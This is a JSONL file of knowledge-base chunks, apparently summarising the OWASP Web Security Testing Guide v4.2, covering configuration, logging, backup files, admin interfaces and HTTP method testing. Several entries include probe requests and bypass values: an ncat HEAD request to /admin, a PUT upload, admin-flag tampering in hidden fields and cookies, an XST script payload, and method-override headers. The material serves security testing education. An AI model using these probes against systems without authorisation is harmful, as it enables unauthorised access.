{"id": "kb-000362", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Test objectives focus on reviewing application configurations to ensure they are not vulnerable and validating that frameworks and systems in use are secure against known vulnerabilities."}
{"id": "kb-000363", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Vulnerabilities in server architecture, such as allowing unauthenticated file uploads or replacements, can severely compromise applications and lead to unauthorized access and modifications. Reviewing server vulnerabilities can be difficult during blind penetration tests, requiring remote automated tools for assessment."}
{"id": "kb-000364", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Automated scanning tools may produce false positives or negatives mainly due to how server versions are reported and managed by system administrators."}
{"id": "kb-000365", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common vulnerabilities may not be flagged if the web server version is removed or obscured by a site administrator, leading to potential misidentification of vulnerabilities."}
{"id": "kb-000366", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Software vendors may not disclose all vulnerabilities publicly, limiting the effectiveness of vulnerability scanning tools, especially for lesser-known products."}
{"id": "kb-000367", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Having internal information about the software versions and patches applied enhances the vulnerability review process, allowing testers to perform a risk analysis of the application architecture."}
{"id": "kb-000368", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Administrative tools are essential for maintaining web server infrastructure, varying based on the technology or software employed, such as using web interfaces or plain text configuration files. Applications may have administrative interfaces embedded within them for managing application data such as users and content."}
{"id": "kb-000369", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Reviewing administrative interfaces is crucial, as gaining access to these can lead to compromise or damage of the application architecture."}
{"id": "kb-000370", "section": null, "tags": ["AUTHN", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "It's important to determine the access control mechanisms for these interfaces and their vulnerabilities; this information might be available online. Changing default usernames and passwords is a foundational step in securing administrative interfaces."}
{"id": "kb-000371", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Some organizations outsource management of their web server applications, potentially exposing administrative interfaces to the internet, increasing risk. Testing the security of these administrative interfaces is essential, especially when third parties manage content or the server entirely. Proper configuration of application architecture elements is crucial to prevent security compromises."}
{"id": "kb-000372", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Configuration review and testing are critical for maintaining a secure architecture, as generic configurations often do not meet specific site needs."}
{"id": "kb-000373", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Default installations of web and application servers often come with unnecessary functionalities like example applications and test pages which should be removed to prevent exploitation."}
{"id": "kb-000374", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives include ensuring removal of default files, validating elimination of debugging code or extensions, and reviewing logging mechanisms in production environments. Black-box testing can be employed to identify default and known files and directories left on servers that may pose security risks."}
{"id": "kb-000375", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Known security vulnerabilities stem from the presence of default web server applications, such as those documented in CVE-1999-0449 and CAN-2002-1630. CGI scanners can help identify known files but a full review of server content is essential for accurate assessment."}
{"id": "kb-000376", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Programmers commonly leave comments in HTML that could leak sensitive internal information, necessitating a review to ensure that no useful information is left exposed to attackers."}
{"id": "kb-000377", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Comment reviews involve analyzing static and dynamic content to detect any leaked information, including examining HTML comments within the code."}
{"id": "kb-000378", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Various tools assist IT and security professionals in assessing target systems' conformance to configuration baselines, including: CIS-CAT Lite, Microsoft’s Attack Surface Analyzer, and NIST’s National Checklist Program. Configuration review of web servers is critical for security, as incorrect configurations pose risks."}
{"id": "kb-000379", "section": null, "tags": ["AUTHZ", "CONF"], "source": "wstg-v4.2.pdf", "text": "General configuration guidelines include: only enabling necessary server modules to reduce attack surface, handling server errors with custom pages to avoid leaking code, and running server software with minimized privileges to mitigate risks. Proper logging of both legitimate access and errors on the server is essential for monitoring and detecting potential threats."}
{"id": "kb-000380", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Configuration should support overload handling to prevent Denial of Service attacks and ensure the server is performance-tuned appropriately."}
{"id": "kb-000381", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Strict access controls should be applied to configuration files like applicationHost.config and redirection.config—only allowing necessary accounts specific access."}
{"id": "kb-000382", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Sensitive information should not be stored in general configuration files like .NET machine.config or root web.config, which are readable by all users."}
{"id": "kb-000383", "section": null, "tags": ["AUTHN", "CONF", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Sensitive information for web server processes should be encrypted, and strong passwords should be used for encryption keys associated with shared configurations. Logging is a critical component of application security architecture used to detect application flaws and attacks."}
{"id": "kb-000384", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "In web applications, improper logging can expose sensitive information. Server logs often unintentionally capture sensitive data due to how GET requests are processed, which can include usernames, passwords, and other personal data. Key issues to test in log analysis include: 1. Presence of sensitive data. 2. Storage location for logs (should ideally be on a dedicated server). 3. Potential log generation leading to Denial of Service (DoS) conditions. 4. Process for log rotation and retention. 5. Method of reviewing logs for detection of targeted attacks. 6. Preservation practices for log backups. 7. Validation of data before logging (checking for proper lengths and characters)."}
{"id": "kb-000385", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Some common examples of sensitive information that can be incidentally logged include: Debug information, Stack traces, Usernames, Internal IP addresses, and PII."}
{"id": "kb-000386", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Data protection laws may require enterprises to treat logged sensitive information similarly to how they treat data in back-end databases; failure to do so can lead to legal penalties."}
{"id": "kb-000387", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "A broader classification of sensitive information may include application source code, session identifiers, access tokens, authentication passwords, and database connection strings."}
{"id": "kb-000388", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Encryption keys, bank account or payment card holder data, data of higher security classification than the logging system is allowed to store, commercially-sensitive information, illegal information collection in the jurisdiction, and information without user consent (i.e., opt-out) should not be logged."}
{"id": "kb-000389", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Logs generated by servers for their actions and errors are critical for understanding system interactions but can be manipulated by attackers using ‘log zapper’ tools to eliminate traces of their activities."}
{"id": "kb-000390", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Storing logs locally on the same server can lead to loss of vital information if the server is compromised; therefore, it's recommended to store logs in a separate location to preserve integrity and facilitate aggregate log analysis from multiple sources."}
{"id": "kb-000391", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Improper log storage can lead to Denial of Service conditions, as an attacker can generate excessive requests to fill up allocated log space, potentially impacting the operating system and applications."}
{"id": "kb-000392", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "In UNIX systems, log files are typically stored in /var, but configurations may place them in /opt or /usr/local. Log directories should be on a separate partition to safeguard the system's disk space."}
{"id": "kb-000393", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Log growth should be monitored to prevent filling up the file system, as this could indicate an attack like excessive logging due to forged or erroneous requests, particularly if QUERY_STRING parameters are logged by the application."}
{"id": "kb-000394", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Log rotation is a process used to manage log file size, assuming logs are only necessary for a limited period; this requires validation against security policy for retention and ensuring that rotated logs maintain the appropriate file system permissions."}
{"id": "kb-000395", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Log rotation is essential to manage log file size and should include permissions settings to prevent server access to these files during rotation. Attackers should not be able to manipulate log rotation to conceal their activities. Log access control is crucial; event logs should not be visible to end users or web administrators to maintain separation of duty controls."}
{"id": "kb-000396", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Access to raw logs and applications for viewing logs should have distinct access control mechanisms that do not overlap with other user roles. Unauthorized users should have no visibility into log data to enhance security. Analysis of log files can help identify web server attacks, not just usage statistics. A high number of 40x error messages from the same source may indicate the use of a CGI scanner against the web server."}
{"id": "kb-000397", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "50x error messages may signal that an attacker is exploiting application vulnerabilities, like SQL injection, leading to unexpected failures in SQL queries."}
{"id": "kb-000398", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Log analysis and statistics should be stored on separate servers from where the logs are generated to prevent an attacker from accessing both logs and their analysis."}
{"id": "kb-000399", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "File extensions indicate the technologies used by web servers and help in determining attack scenarios. Misconfiguration of web servers can reveal confidential information, such as access credentials."}
{"id": "kb-000400", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Extension checking in file uploads can lead to security issues, particularly if expected content or operating system filename handling is not as anticipated."}
{"id": "kb-000401", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding web server responses to different file extensions helps to identify server-side execution versus static content, which is crucial for security assessments."}
{"id": "kb-000402", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The presence of certain file extensions can indicate specific server technologies, like '.pl' for server-side Perl, although misdirection can occur where actual server-side technologies are obscured by renaming files."}
{"id": "kb-000403", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "To test file extension handling, penetration testers should perform forced browsing to see how different extensions are handled, focusing on web directories, especially those allowing script execution."}
{"id": "kb-000404", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Testing should include all web servers in a load-balanced architecture, as variations in configurations can lead to different vulnerabilities. This complexity must be carefully evaluated during security assessments."}
{"id": "kb-000405", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example provided describes a sensitive file, 'connection.inc', that when accessed reveals sensitive MySQL connection code, highlighting the risk of exposing sensitive materials through improper file handling."}
{"id": "kb-000406", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The tester must determine the existence of a MySQL DBMS back end and identify the credentials used by the web application, especially if they are weak."}
{"id": "kb-000407", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Certain file extensions should never be returned by a web server, as they may contain sensitive information or are unnecessary to serve. Examples include: .asa, .inc, .config."}
{"id": "kb-000408", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "File extensions such as .zip, .tar, .gz, .java, .txt, .pdf, .docx, .bak, and .old must be carefully checked to ensure they are not serving sensitive data or leftover files."}
{"id": "kb-000409", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Techniques for identifying files with specific extensions include using vulnerability scanners, spidering and mirroring tools, manual inspection, and querying search engines."}
{"id": "kb-000410", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Windows 8.3 legacy file handling can be exploited to defeat file upload filters, allowing potential harmful files to be uploaded and executed."}
{"id": "kb-000411", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In Gray-Box Testing, an evaluation is conducted on how web and application servers are configured to handle different file extensions, considering the infrastructure's architecture."}
{"id": "kb-000412", "section": null, "tags": ["AUTHN", "CONF", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Tools such as Nessus and Nikto are used to check for well-known web directories and facilitate determination of the configuration of web directories and file extension handling. Unreferenced or forgotten files on a web server can reveal sensitive information about infrastructure or credentials."}
{"id": "kb-000413", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common scenarios include renamed old versions of files, inclusion files that can be downloaded as source code, and backups in compressed formats like .zip or .tar. Backup files may inadvertently be created during administrative actions, such as editing or zipping files, and can pose security threats."}
{"id": "kb-000414", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Files edited on production servers can leave backup copies with different extensions, which are served differently by web servers, exposing sensitive data."}
{"id": "kb-000415", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Exposing server-side code, such as a backup file of a login page, can reveal application logic and sensitive credentials, which can aid potential attackers."}
{"id": "kb-000416", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Files such as configuration files, data files, and log files should not be accessible via the web server; exposing them creates security vulnerabilities."}
{"id": "kb-000417", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Old, backup, and unreferenced files pose various security threats to web applications, including the disclosure of sensitive information necessary for targeted attacks. Unreferenced files may contain sensitive data such as database credentials and configuration files, which can be exploited by attackers."}
{"id": "kb-000418", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Unreferenced pages can expose powerful functionalities, such as administrative pages that aren't linked from public content, allowing access to any user who discovers the URL."}
{"id": "kb-000419", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Old versions of files can harbor vulnerabilities that have been patched in newer versions (e.g., viewdoc.old.jsp may contain exploitable code fixed in viewdoc.jsp)."}
{"id": "kb-000420", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Backup files can leak the source code of scripts that execute on the server (e.g., requesting viewdoc.bak may reveal vulnerabilities in viewdoc.jsp)."}
{"id": "kb-000421", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Backup archives can provide comprehensive access to all application files, including sensitive source code and configuration files that attackers can reverse-engineer."}
{"id": "kb-000422", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "File naming conventions in certain environments (like Windows) can lead to the creation of files that may contain outdated logic or erroneous information that can be exploited if accessed."}
{"id": "kb-000423", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Log files might expose sensitive information about application user activities, session IDs, or URLs visited, potentially revealing additional unreferenced content."}
{"id": "kb-000424", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "File system snapshots could contain outdated code versions containing known vulnerabilities, allowing exploitation by attackers who find these old files."}
{"id": "kb-000425", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for unreferenced files should involve both automated and manual techniques, often beginning with inference from the naming schemes of published content. Web applications can leave clues about hidden pages and functionality in their published content, especially in source code."}
{"id": "kb-000426", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Programmers' comments in HTML and JavaScript source code can reveal references to hidden content. For example, commented-out links or instructions in the code can hint at existing but unlinked pages."}
{"id": "kb-000427", "section": null, "tags": ["AUTHZ", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "JavaScript may be used to conditionally render links based on user roles, implying that certain functionalities exist but are not visible without specific conditions being met. Example: An administrative menu item that is only displayed if an adminUser variable is true."}
{"id": "kb-000428", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "HTML forms can contain hidden inputs and disabled submit buttons that suggest additional functionalities or actions, such as a 'Forgot Password' feature that is not currently active."}
{"id": "kb-000429", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The /robots.txt file can indicate directories that webmasters do not want indexed or accessed by web crawlers, providing potential insight into unreferenced directories that may exist on the server."}
{"id": "kb-000430", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Blind guessing involves using a list of common filenames to probe a server for hidden files and directories. An example is provided of a netcat wrapper script that automates this process, sending GET requests to common URLs and checking for server responses."}
{"id": "kb-000431", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When performing web security testing, responses codes such as 200 (OK), 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden), and 500 (Internal error) are crucial. Each code can indicate the presence of resources or directories worth further investigation. GET requests can sometimes be substituted with HEAD requests for faster results when testing servers. The basic guessing attack should target the webroot as well as directories found through enumeration techniques."}
{"id": "kb-000432", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Advanced guessing attacks involve identifying file extensions used within the application and using wordlists of these extensions to check for vulnerabilities. Common file extensions, such as ~, bak, txt, src, dev, and tmp, should be tested in various configurations around known filenames."}
{"id": "kb-000433", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Windows file copying operations can create filenames prefixed with 'Copy of ', which may leak error messages without disclosing source code."}
{"id": "kb-000434", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Misconfigured servers can disclose unreferenced pages through directory listings; hence, it's important to request enumerated directories to check for this vulnerability. Vulnerabilities, such as Apache directory listing or IIS script source disclosure, highlight the need for careful server management."}
{"id": "kb-000435", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Use of search engines to find outdated or unreferenced pages can reveal vulnerabilities; for example, the Google search operator 'site:www.example.com' helps locate indexed pages of a specific domain."}
{"id": "kb-000436", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Backup files may not be referenced elsewhere and can still be exposed in browsable directories, thus becoming potential targets for exploitation. Cached versions of pages by search engines like Google and Yahoo can provide clues about additional hidden content on a server."}
{"id": "kb-000437", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Filename filter bypass tricks can exploit unexpected OS filename expansion features to bypass security measures of a web application. An example is the Windows 8.3 filename convention, which compresses paths in a misleading way."}
{"id": "kb-000438", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Gray-Box Testing**: This involves testing where the tester has partial knowledge of the internal workings of the application. In web security, it includes examining files in the directories served by web servers, especially old or backup files. It could ideally be done manually, but scripting can streamline the process, especially since backup files often follow recognizable naming conventions. Examples of backup file extensions include '.old' or other predictable endings."}
{"id": "kb-000439", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Remediation Best Practices**: Effective protection strategies must include a security policy that prohibits risky practices, such as directly editing files on the production web or application server file systems. It is crucial to avoid leaving behind unintended backup or temporary files as a result of editing."}
{"id": "kb-000440", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "**File Management Strategies**: Applications should avoid creating any files that reside in web server-accessible directories. Data, log, and configuration files should be stored in secure, non-public directories to mitigate risks of unauthorized access."}
{"id": "kb-000441", "section": null, "tags": ["AUTHZ", "CONF"], "source": "wstg-v4.2.pdf", "text": "**Access Control Configurations**: To prevent unauthorized access to sensitive data like file system snapshots, configure web servers to deny access to specific directory paths. For example, in Apache, the configuration should include directives like:\n<Location ~ \".snapshot\">\nOrder deny,allow\nDeny from all\n</Location>"}
{"id": "kb-000442", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Tools for Security Assessment**: Several tools can help in vulnerability assessments by checking web directories for standard names known to have security implications (like 'admin', 'test', 'backup'). Examples include 'Nessus' and 'Nikto2', which can scan for directory listings and can report on potential vulnerabilities related to backup file naming and presence."}
{"id": "kb-000443", "section": null, "tags": ["AUTHZ", "CONF"], "source": "wstg-v4.2.pdf", "text": "Administrator interfaces are critical points in web applications that allow privileged users to perform administrative tasks such as user account provisioning, site design changes, data manipulation, and configuration adjustments."}
{"id": "kb-000444", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A significant risk exists as many administrator interfaces may lack sufficient security controls, leading to potential unauthorized access by standard users."}
{"id": "kb-000445", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for administrator interfaces involves identifying hidden entry points and functionality that should only be accessible to authorized users."}
{"id": "kb-000446", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Black-box testing techniques are used to discover administrative interfaces. This can include directory and file enumeration by guessing paths like '/admin' or '/administrator', possibly using search engines to find such interfaces. Brute force tools can assist testers in uncovering these administrative areas if they are not directly visible."}
{"id": "kb-000447", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Reviewing source code can reveal links to administrator functionality that might not be apparent in the user interface, thus exposing vulnerabilities."}
{"id": "kb-000448", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Consulting server and application documentation can provide information about default administrative interface credentials and configurations, which can lead to unauthorized access if default settings are still in use. Some applications have well-known default administrative paths and interfaces, such as WordPress, which can be targeted in testing."}
{"id": "kb-000449", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Checking for alternative server ports is essential since administrative interfaces may run on different ports than the main application, an example being Apache Tomcat's admin interface on port 8080."}
{"id": "kb-000450", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Parameter tampering involves examining GET, POST parameters, or cookies to unlock administrator functionalities, hinting at such clues through hidden fields."}
{"id": "kb-000451", "section": null, "tags": ["AUTHN", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Authentication bypass techniques may include manipulating hidden input fields or cookies (e.g., <input type='hidden' name='admin' value='no'> or Cookie: session_cookie; useradmin=0)."}
{"id": "kb-000452", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "If initial authentication bypass attempts fail, one method to attempt access is brute force attacking, but testers must consider the risk of administrative account lockout. This is essential in preventing unintended denial of service for legitimate users."}
{"id": "kb-000453", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Gray-Box Testing involves a thorough examination of the server and application components to ensure hardening is effective, ensuring that administrative interfaces are protected from unauthorized access. Testing must verify that components do not utilize default credentials or configurations to mitigate security risks."}
{"id": "kb-000454", "section": null, "tags": ["AUTHN", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "It's important to review the source code to confirm that the authorization and authentication model maintains a clear separation of duties between normal users and administrators, reducing the risk of privilege escalation."}
{"id": "kb-000455", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing shared user interface functions between normal and administrator accounts must ensure there is a clear separation to prevent information leakage."}
{"id": "kb-000456", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Specific web frameworks have their own default administrative pages that should be identified during a security assessment, such as WebSphere (e.g., /admin, /admin.conf) or PHP (e.g., /phpmyadmin, /login.php)."}
{"id": "kb-000457", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The page lists various administrative paths for different frameworks and applications, such as WebLogic and WordPress, indicating critical directories for security testing."}
{"id": "kb-000458", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Specific WebLogic administrative paths are highlighted, including /AdminCaptureRootCA, /AdminClients, /AdminConnections, and other admin endpoints, which could be potential targets for unauthorized access."}
{"id": "kb-000459", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The WordPress directories provided include essential files like wp-admin/about.php and wp-admin/admin-ajax.php, which are crucial for understanding web application structure and potential vulnerabilities."}
{"id": "kb-000460", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "OWASP ZAP is mentioned as a tool relevant for security testing, specifically in the context of forced browsing, demonstrating its relationship with previous security testing tools."}
{"id": "kb-000461", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "THC-HYDRA is introduced as a brute force tool that supports various interfaces, highlighting its functionality with form-based HTTP authentication, emphasizing its utility in security testing."}
{"id": "kb-000462", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The effectiveness of brute forcers, like THC-HYDRA, is noted to rely on good dictionaries (e.g., netsparker dictionary), underlining the importance of utilizing well-constructed lists of potential passwords in security testing processes."}
{"id": "kb-000463", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Resources for security testing methodologies include references to Cirt's default password list and FuzzDB, which provides datasets for brute forcing admin login paths, showcasing datasets used in penetration testing. HTTP offers a range of methods for performing actions on a web server, commonly referred to as 'verbs'. The standard methods identified by RFC 7231 for HTTP/1.1 include: GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, and TRACE."}
{"id": "kb-000464", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "GET and POST are the most commonly used methods in web applications, while methods like PUT and DELETE can pose security risks if not properly managed."}
{"id": "kb-000465", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The use of methods other than GET and POST is rare, leading to many developers being unaware of the security implications of how their server or application handles these methods."}
{"id": "kb-000466", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Testing objectives for web security involving HTTP methods include: enumerating supported methods, testing for access control bypass, identifying XST vulnerabilities, and employing HTTP method overriding techniques."}
{"id": "kb-000467", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To discover supported HTTP methods on a web server, one can use the OPTIONS method or manual testing. The Nmap script 'http-methods' can also assist in this process."}
{"id": "kb-000468", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Testing the HTTP PUT Method involves altering requests to upload files to the server. If the server returns a 2XX or 3XX status after a PUT request, the application may be vulnerable to file uploads."}
{"id": "kb-000469", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Example of a PUT request:\nPUT /test.html HTTP/1.1\nHost: testing-website\n<html>\nHTTP PUT Method is Enabled\n</html>\nIf the server successfully accepts this request, it may allow malicious file uploads, potentially leading to remote code execution or denial of service."}
{"id": "kb-000470", "section": null, "tags": ["AUTHZ", "HTTP"], "source": "wstg-v4.2.pdf", "text": "When testing for Access Control Bypass, send requests using different HTTP methods (e.g., HEAD, POST, PUT) and even non-standard methods to check if the web application responds differently than expected. A 200 OK response on a protected resource may indicate a vulnerability."}
{"id": "kb-000471", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example testing scenario using ncat:\n$ ncat www.example.com 80\nHEAD /admin HTTP/1.1\nHost: www.example.com\nThe response should be analyzed: If it returns 200 OK and is not a login page, there's a potential security flaw."}
{"id": "kb-000472", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The three HTTP commands provided (HEAD, PUT, CATS) suggest methods for manipulating user accounts by creating a new user, assigning a password, and granting administrator rights through blind request submission."}
{"id": "kb-000473", "section": null, "tags": ["AUTHN", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Cross-Site Tracing (XST) exploits the TRACE method of the HTTP protocol, which can reflect received messages back to the client, potentially allowing attackers to steal user credentials by bypassing HttpOnly cookie protection."}
{"id": "kb-000474", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The TRACE method exploit was initially discovered by Jeremiah Grossman in 2003, aimed at circumventing security associated with the HttpOnly attribute of cookies."}
{"id": "kb-000475", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of testing for XST potential includes issuing a request with the TRACE method to confirm the server's reflection of a set header, which can be tested using tools like 'ncat'."}
{"id": "kb-000476", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To exploit the XST vulnerability, a malicious script can be inserted into the request (e.g., <script>prompt()</script>) to check if the response is reflected in a manner that allows execution within the HTML context."}
{"id": "kb-000477", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "While older browsers are susceptible to leaks via XHR technology, newer browsers require applications to employ technologies similar to Flash for the attack to succeed."}
{"id": "kb-000478", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "HTTP method overriding allows web frameworks to circumvent restrictions on certain HTTP methods (e.g., PUT, DELETE) by utilizing custom headers that instruct the server to treat the request as a different method."}
{"id": "kb-000479", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Common headers used for HTTP method overriding testing include X-HTTP-Method, X-HTTP-Method-Override, and X-Method-Override, which can help elude middleware limitations that block certain HTTP verbs. The application should respond with different status codes, such as 200, when method overriding is supported."}
{"id": "kb-000480", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example demonstrates a web server rejecting a DELETE request with a '405 Method Not Allowed' status. This indicates that the DELETE method is not permitted for the requested resource."}
{"id": "kb-000481", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "After adding the 'X-HTTP-Method' header, the web server responds to the DELETE request with a '200 OK' status, showing that method overriding can be used to bypass restrictions. Remediation advice includes ensuring that only required headers are allowed and properly configured to prevent security bypass. Important tools for web security testing mentioned are Ncat, cURL, nmap with the http-methods NSE script, and w3af plugin htaccess_methods."}
{"id": "kb-000482", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Definition of HTTP Strict Transport Security (HSTS)**: HSTS is a web security policy mechanism that helps to protect websites against man-in-the-middle attacks such as protocol downgrade attacks and cookie hijacking by enforcing the use of HTTPS over HTTP."}
{"id": "kb-000483", "section": null, "tags": ["CRYPTO", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "**Functionality of HSTS**: It informs the browser through a special response header to never connect to the domain using unencrypted HTTP, ensuring all communication is encrypted via HTTPS."}
